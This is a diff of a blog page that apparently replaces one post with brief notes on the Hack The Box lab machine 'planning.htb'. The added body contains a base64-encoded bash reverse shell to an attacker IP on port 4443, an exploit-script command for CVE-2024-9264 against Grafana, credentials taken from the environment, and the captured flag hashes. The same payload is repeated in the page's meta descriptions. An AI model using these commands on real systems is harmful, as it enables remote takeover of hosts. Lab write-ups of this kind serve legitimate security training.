@@ -6,18 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
+    <meta name="description" content="base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D; bash -c ‘{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D;}|{base64,-d}|{bash,-i}’ echo YmFzaCAtaSA+JiAvZGV2L3Rjc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MonitorsThree">
-<meta property="og:url" content="https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/index.html">
+<meta property="og:title" content="planning.htb">
+<meta property="og:url" content="https://feesec.github.io/2025/05/17/planning-htb/index.html">
 <meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
-<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
+<meta property="og:description" content="base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D; bash -c ‘{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D;}|{base64,-d}|{bash,-i}’ echo YmFzaCAtaSA+JiAvZGV2L3Rjc">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-11-13T11:03:45.167Z">
-<meta property="article:modified_time" content="2024-11-13T11:03:45.167Z">
+<meta property="article:published_time" content="2025-05-17T07:44:40.439Z">
+<meta property="article:modified_time" content="2025-05-17T07:44:40.439Z">
 <meta property="article:author" content="Leon">
-<meta property="article:tag" content="Linux">
-<meta property="article:tag" content="THB">
+<meta property="article:tag" content="htb">
 <meta name="twitter:card" content="summary">
     
     
@@ -38,7 +37,7 @@
       
     
     <!-- title -->
-    <title>MonitorsThree</title>
+    <title>planning.htb</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -103,10 +102,8 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="上一篇" href="/2024/11/13/2024-10-13-JWT%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
-        
-        <li><a class="icon" aria-label="下一篇" href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/2025/04/26/DE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -119,17 +116,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&text=MonitorsThree"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&is_video=false&description=MonitorsThree"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=MonitorsThree&body=Check out this article: https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&name=MonitorsThree&description=Here&#39;s something encrypted, password is required to continue reading."><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&t=MonitorsThree"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2025/05/17/planning-htb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2025/05/17/planning-htb/&text=planning.htb"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2025/05/17/planning-htb/&is_video=false&description=planning.htb"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=planning.htb&body=Check out this article: https://feesec.github.io/2025/05/17/planning-htb/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2025/05/17/planning-htb/&name=planning.htb&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2025/05/17/planning-htb/&t=planning.htb"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -145,7 +142,7 @@
   <header>
     
     <h1 class="posttitle p-name" itemprop="name headline">
-        MonitorsThree
+        planning.htb
     </h1>
 
 
@@ -157,9 +154,9 @@
       
     <div class="postdate">
       
-        <time datetime="2024-11-13T11:03:45.167Z" class="dt-published" itemprop="datePublished">2024-11-13</time>
+        <time datetime="2025-05-17T07:44:40.439Z" class="dt-published" itemprop="datePublished">2025-05-17</time>
         
-        (Updated: <time datetime="2024-11-13T11:03:45.167Z" class="dt-updated" itemprop="dateModified">2024-11-13</time>)
+        (Updated: <time datetime="2025-05-17T07:44:40.439Z" class="dt-updated" itemprop="dateModified">2025-05-17</time>)
         
       
     </div>
@@ -168,14 +165,14 @@
       
     <div class="article-category">
         <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        <a class="category-link" href="/categories/websec/">websec</a> › <a class="category-link" href="/categories/websec/htb/">htb</a>
     </div>
 
 
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/THB/" rel="tag">THB</a>
+        <a class="p-category" href="/tags/htb/" rel="tag">htb</a>
     </div>
 
 
@@ -184,18 +181,22 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">
-  <script id="hbeData" type="hbeData" data-hmacdigest="c0eb4cf71f1a2148d86a8016569088f65684e133334cae32b23bdf32cdc6ee7b">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259614437644d13c3b329af8fec292588f08255a9c57c03c7bbae47bfc8af8a04648593c61c347cfcf35c63b8a4e06256700a6882fc9a7a1d22e88723d69ff3adb295e1413ff7b0190229f531d1e91730f44f808e01f508f8c3e44e6bf6e71af5d8613bf9540b2396c0b51787c349bedbef2d28c848814c7f02183ce29ce4e8c00b7e54981558066e17a990b1442a970a53db3f88b126351504b1e21456cae198d37830c62866b2e509455cca5e9942ba48fb66ff9510c76aa50d4d659e1e86556efeb97e396a3cf34157995b652d5d49e881f5bdea12225b57bb917b57a30a2129d2da5f9b3455b1d3d2a03543de7ae62f82e56726513c7d7090cfd4024db9dbeb5c841399dc406d9d63d1c0d5d7f4d627b6e6b437d5200d55eb8a8e60a4a16137285d64d47149b5099111be904a1f6dccafdc6ee04f79f7dcbe2d38a06ac32aae914afde949ffa7983958de7842588df0a4b67f558c3a2a4df99105cad96f157f13a596be1fc64d10c392130d4624977869102b0d4f70cc0317c3f08a844bb9db3671a1c3200b9825c3a317b2d1f7043a59dce5ab58b0f3754ca387e759aceee4b474fcd1d8890a6ef42a2e28347a5c8405503cb47784fe1db3ea94eb7d49237daf4ef0b14662f21d15fb1fca2995ce469bda6e92f6ea63f26343a7d616da1bb9f8b4ba4959b717dbffcef7af823f5c77887d3012b03eef30a1d32970a8f6ef7670406eb1cf3fe655862f4825aa9dcb42cc10a18f57a3ad31b5d448bf714daff18add8004101dfee9c58d77c42d2cea3cabcda43d1c0761d6ddb7f573c3d5756eb1e442a34b3c43fac9208765e268d0417097db5bf300c580fcc9558ff2947935ae2f4185ff3b226d27b930d77a9d1bde1b1fc47978a811a802724f0298c029f444a46288e6f7d44fdc5385b5e74fd4e303b78ab309b293313755146e7ed4708bc3a26fcc5e2a313bac2a6978b5abc7c73</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>base64</p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D;</p>
+<p>bash -c ‘{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D;}|{base64,-d}|{bash,-i}’</p>
+<p>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D; | base64 -d | bash’</p>
+<p>uv run CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c ‘echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE&#x3D; | base64 -d | bash’ <a target="_blank" rel="noopener" href="http://grafana.planning.htb/">http://grafana.planning.htb/</a></p>
+<p>env 获取passwd，username</p>
+<p>RioTecRANDEntANT!</p>
+<p>enzo</p>
+<p>ssh <a href="mailto:&#101;&#110;&#122;&#111;&#x40;&#112;&#108;&#x61;&#110;&#x6e;&#x69;&#x6e;&#x67;&#46;&#x68;&#x74;&#x62;">&#101;&#110;&#122;&#111;&#x40;&#112;&#108;&#x61;&#110;&#x6e;&#x69;&#x6e;&#x67;&#46;&#x68;&#x74;&#x62;</a></p>
+<p>user.txt<br>c5edef7a894239d2bb48415661e20b32<br>root.txt<br>2463aa9b7a928bcdc33223fb8c9ca74a</p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -236,17 +237,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&text=MonitorsThree"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&is_video=false&description=MonitorsThree"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=MonitorsThree&body=Check out this article: https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&title=MonitorsThree"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&name=MonitorsThree&description=Here&#39;s something encrypted, password is required to continue reading."><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/&t=MonitorsThree"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2025/05/17/planning-htb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2025/05/17/planning-htb/&text=planning.htb"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2025/05/17/planning-htb/&is_video=false&description=planning.htb"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=planning.htb&body=Check out this article: https://feesec.github.io/2025/05/17/planning-htb/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2025/05/17/planning-htb/&title=planning.htb"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2025/05/17/planning-htb/&name=planning.htb&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2025/05/17/planning-htb/&t=planning.htb"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
